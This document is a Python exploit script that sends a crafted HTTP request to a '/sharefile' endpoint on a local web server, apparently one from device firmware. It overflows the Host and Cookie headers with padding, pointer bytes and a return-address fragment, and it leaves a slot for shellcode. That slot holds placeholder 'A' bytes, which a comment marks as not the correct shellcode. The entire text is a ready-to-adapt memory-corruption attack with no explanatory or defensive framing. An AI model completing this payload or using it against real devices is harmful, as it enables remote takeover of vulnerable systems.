
import socket

p = socket.socket(socket.AF_INET, socket.SOCK_STREAM)                 
p.connect(("127.0.0.1" , 18080))

shellcode = "A"*0x200   # *** Not the correct shellcode for exploit ***

rn = "\r\n"
strptr = "\x60\x70\xff\x7f"
padding = "\x00\x00\x00\x00"

payload = "GET /sharefile?test=A" + "HTTP/1.1" + rn
payload += "Host: " + "A"*0x70 + strptr*2 + "A"*0x24  + "\xb8\xfe\x48" + rn
payload += "User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:59.0) Gecko/20100101 Firefox/59.0" + rn
payload += "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8" + rn
payload += "Accept-Language: en-US,en;q=0.5" + rn
payload += "Accept-Encoding: gzip, deflate" + rn
payload += "Cookie: curShow=; ac_login_info=passwork; test=A" + padding*0x200 + shellcode + padding*0x4000 + rn
payload += "Connection: close" + rn
payload += "Upgrade-Insecure-Requests: 1" + rn
payload += rn

p.send(payload)

print(p.recv(4096))
